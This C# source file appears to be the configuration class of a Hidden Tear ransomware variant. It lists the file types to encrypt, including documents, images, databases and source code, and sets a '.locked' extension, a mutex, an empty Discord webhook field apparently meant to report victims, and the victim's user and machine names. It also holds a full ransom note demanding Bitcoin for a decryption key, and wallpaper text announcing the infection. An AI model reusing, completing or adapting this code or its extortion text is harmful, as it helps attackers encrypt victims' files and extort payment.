using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace hidden_tear.Tools
{
    internal class Config
    {
        public static string[] extensionToEncrypt = new string[]{ ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf", ".sqlite3", ".db" };
        public static string DiscordWebhook = "";
        public static string encryptedExtension = ".locked";
        public static string userName = Environment.UserName;
        public static string computerName = System.Environment.MachineName.ToString();
        public static string userDir = "C:\\Users\\";
        public static string mutex = "dsdoskdosk837928hduijfh";
        public static string days, hours, minutes, secs;
        public static int year = DateTime.Now.Year, month = DateTime.Now.Month, day = 13;


        public static string note = "Attention!\r\n\r\nYour files have been encrypted with strong encryption algorithms. The only way to get your files back is by purchasing the decryption key from us.\r\n\r\nInstructions\r\n\r\n1. Contact us via email at decrypt@hidden-tear.com to get further instructions on how to pay for the decryption key.\r\n2. You will receive a unique Bitcoin wallet address to send the payment.\r\n3. Once the payment is confirmed, you will receive the decryption key to unlock your files.\r\n\r\nWarning\r\n\r\nDo not attempt to decrypt the files using third-party tools, as it may result in permanent data loss. Any attempts to tamper with the encryption will lead to the permanent loss of your files.\r\n\r\nRemember, time is of the essence. Delaying the payment or any unauthorized actions will result in the permanent loss of your valuable data.";

        public static string[] WALLPAPER =
        {
            "Hidden Tear Ransomware",
            "Your files have been infected and stolen",
            "Follow the instructions"
        };
    }
}